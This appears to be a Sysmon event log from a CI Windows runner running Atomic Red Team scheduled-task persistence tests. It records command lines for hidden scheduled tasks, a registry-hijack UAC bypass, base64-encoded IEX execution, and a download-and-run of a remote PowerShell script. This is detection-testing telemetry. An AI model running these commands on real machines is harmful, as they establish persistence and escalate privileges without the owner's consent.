"12/17/2025 7:59:35 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:35.340
ProcessGuid: {f995aebf-62e7-6942-7405-000000000e00}
ProcessId: 5508
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /Create /TN ""CompMgmtBypass"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHEST /F 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62e7-6942-7105-000000000e00}
ParentProcessId: 4708
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /ve /t REG_EXPAND_SZ /d ""c:\windows\System32\calc.exe"" /f & schtasks /Create /TN ""CompMgmtBypass"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHEST /F & ECHO Let's open the Computer Management console now... & compmgmt.msc
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:34 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:34.782
ProcessGuid: {f995aebf-5514-6942-3300-000000000e00}
ProcessId: 2640
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\AtomicTaskModifed
CreationUtcTime: 2025-12-17 07:59:34.782
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:34 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:34.319
ProcessGuid: {f995aebf-62e6-6942-6d05-000000000e00}
ProcessId: 9676
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u5r1ubn4.h4m.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:34 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:34.300
ProcessGuid: {f995aebf-62e6-6942-6d05-000000000e00}
ProcessId: 9676
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u5r1ubn4.h4m.ps1
CreationUtcTime: 2025-12-17 07:59:34.300
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:34 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:59:32.124
ProcessGuid: {f995aebf-62e3-6942-6305-000000000e00}
ProcessId: 10072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59082
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:59:33 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:59:32.121
ProcessGuid: {f995aebf-62e3-6942-6305-000000000e00}
ProcessId: 10072
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:33 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:33.975
ProcessGuid: {f995aebf-5514-6942-3300-000000000e00}
ProcessId: 2640
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\atomic red team
CreationUtcTime: 2025-12-17 07:59:33.975
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:33 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:33.687
ProcessGuid: {f995aebf-62e5-6942-6b05-000000000e00}
ProcessId: 6448
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_b40wyxjx.ovg.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:33 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:33.670
ProcessGuid: {f995aebf-62e5-6942-6b05-000000000e00}
ProcessId: 6448
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_b40wyxjx.ovg.ps1
CreationUtcTime: 2025-12-17 07:59:33.670
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:33.594
ProcessGuid: {f995aebf-62e5-6942-6b05-000000000e00}
ProcessId: 6448
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$xml = [System.IO.File]::ReadAllText(\""""C:\AtomicRedTeam\atomics\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml\"""")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \""""Root\Microsoft\Windows\TaskScheduler\"""" -MethodName \""""RegisterByXml\"""" -Arguments @{ Force = $true; Xml =$xml; }}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:33 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:33.364
ProcessGuid: {f995aebf-5514-6942-3300-000000000e00}
ProcessId: 2640
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\ATOMIC-T1053.005
CreationUtcTime: 2025-12-17 07:59:33.364
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:33.349
ProcessGuid: {f995aebf-62e5-6942-6a05-000000000e00}
ProcessId: 5460
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks.exe  /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62e5-6942-6705-000000000e00}
ParentProcessId: 3292
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f & schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:33.318
ProcessGuid: {f995aebf-62e5-6942-6705-000000000e00}
ProcessId: 3292
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f & schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:33 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:33.069
ProcessGuid: {f995aebf-5514-6942-3300-000000000e00}
ProcessId: 2640
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\T1053_005_WMI
CreationUtcTime: 2025-12-17 07:59:33.069
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:32 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:32.781
ProcessGuid: {f995aebf-62e4-6942-6505-000000000e00}
ProcessId: 6384
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u30xwze0.0py.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:32 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:32.763
ProcessGuid: {f995aebf-62e4-6942-6505-000000000e00}
ProcessId: 6384
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u30xwze0.0py.ps1
CreationUtcTime: 2025-12-17 07:59:32.763
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:32 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:32.691
ProcessGuid: {f995aebf-62e4-6942-6505-000000000e00}
ProcessId: 6384
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$xml = [System.IO.File]::ReadAllText(\""""C:\AtomicRedTeam\atomics\T1053.005\src\T1053_005_WMI.xml\"""")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \""""Root\Microsoft\Windows\TaskScheduler\"""" -MethodName \""""RegisterByXml\"""" -Arguments @{ Force = $true; Xml =$xml; }}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:31 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:31.902
ProcessGuid: {f995aebf-62e3-6942-6305-000000000e00}
ProcessId: 10072
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_5jdxb4ii.pgy.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:31 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:31.886
ProcessGuid: {f995aebf-62e3-6942-6305-000000000e00}
ProcessId: 10072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_5jdxb4ii.pgy.ps1
CreationUtcTime: 2025-12-17 07:59:31.886
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:31 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:31.809
ProcessGuid: {f995aebf-62e3-6942-6305-000000000e00}
ProcessId: 10072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing) 
Invoke-MalDoc -macroFile \""""C:\AtomicRedTeam\atomics\T1053.005\src\T1053.005-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""Scheduler\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:31 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:31.548
ProcessGuid: {f995aebf-5514-6942-3300-000000000e00}
ProcessId: 2640
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\AtomicTask
CreationUtcTime: 2025-12-17 07:59:31.547
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:31 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:31.047
ProcessGuid: {f995aebf-62e2-6942-6105-000000000e00}
ProcessId: 8376
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rbjo1xmf.phn.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:31 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:31.029
ProcessGuid: {f995aebf-62e2-6942-6105-000000000e00}
ProcessId: 8376
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rbjo1xmf.phn.ps1
CreationUtcTime: 2025-12-17 07:59:31.029
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:30 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:30.707
ProcessGuid: {f995aebf-62e2-6942-6005-000000000e00}
ProcessId: 10172
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: SCHTASKS  /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN ""Atomic task"" /TR ""C:\windows\system32\cmd.exe"" /SC daily /ST 20:10
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62e2-6942-5e05-000000000e00}
ParentProcessId: 1556
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c SCHTASKS /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN ""Atomic task"" /TR ""C:\windows\system32\cmd.exe"" /SC daily /ST 20:10
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:30 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:30.458
ProcessGuid: {f995aebf-5514-6942-3300-000000000e00}
ProcessId: 2640
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\spawn
CreationUtcTime: 2025-12-17 07:59:30.458
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:30 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:30.442
ProcessGuid: {f995aebf-62e2-6942-5d05-000000000e00}
ProcessId: 2420
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: SCHTASKS  /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62e2-6942-5b05-000000000e00}
ParentProcessId: 4004
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:30 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:30.190
ProcessGuid: {f995aebf-5514-6942-3300-000000000e00}
ProcessId: 2640
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\T1053_005_OnStartup
CreationUtcTime: 2025-12-17 07:59:30.190
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:30 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:30.175
ProcessGuid: {f995aebf-62e2-6942-5a05-000000000e00}
ProcessId: 6940
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62e2-6942-5705-000000000e00}
ParentProcessId: 2988
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" & schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:30 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:30.158
ProcessGuid: {f995aebf-5514-6942-3300-000000000e00}
ProcessId: 2640
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\T1053_005_OnLogon
CreationUtcTime: 2025-12-17 07:59:30.158
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:30 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:30.140
ProcessGuid: {f995aebf-62e2-6942-5905-000000000e00}
ProcessId: 5520
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62e2-6942-5705-000000000e00}
ParentProcessId: 2988
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" & schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:28 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:28.169
ProcessGuid: {f995aebf-62e0-6942-4b05-000000000e00}
ProcessId: 9700
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\System\CurrentControlSet\Control\Session Manager\Configuration Manager\LastKnownGood\Enabled
Details: DWORD (0x00000001)
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:28 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:28.079
ProcessGuid: {f995aebf-62df-6942-4905-000000000e00}
ProcessId: 8872
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_tn5fv4lz.qrk.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:28 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:28.062
ProcessGuid: {f995aebf-62df-6942-4905-000000000e00}
ProcessId: 8872
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_tn5fv4lz.qrk.ps1
CreationUtcTime: 2025-12-17 07:59:28.062
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:27 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 07:59:27.796
ProcessGuid: {f995aebf-62df-6942-4805-000000000e00}
ProcessId: 1108
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\calc
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:27 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:27.608
ProcessGuid: {f995aebf-552f-6942-d600-000000000e00}
ProcessId: 7580
Image: C:\Windows\system32\svchost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.StartupApp\Enabled
Details: DWORD (0x00000000)
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:27 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:27.594
ProcessGuid: {f995aebf-552f-6942-d500-000000000e00}
ProcessId: 7572
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNoticalc
Details: DWORD (0x00000000)
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:27 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:27.594
ProcessGuid: {f995aebf-552f-6942-d500-000000000e00}
ProcessId: 7572
Image: C:\Windows\system32\sihost.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:27 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:27.594
ProcessGuid: {f995aebf-552f-6942-d500-000000000e00}
ProcessId: 7572
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:27 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:27.594
ProcessGuid: {f995aebf-552f-6942-d500-000000000e00}
ProcessId: 7572
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:27 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 07:59:27.568
ProcessGuid: {f995aebf-62df-6942-4405-000000000e00}
ProcessId: 6916
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell-backup
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:27 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:27.565
ProcessGuid: {f995aebf-62df-6942-4405-000000000e00}
ProcessId: 6916
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
Details: explorer.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:27 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:27.380
ProcessGuid: {f995aebf-62df-6942-4405-000000000e00}
ProcessId: 6916
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
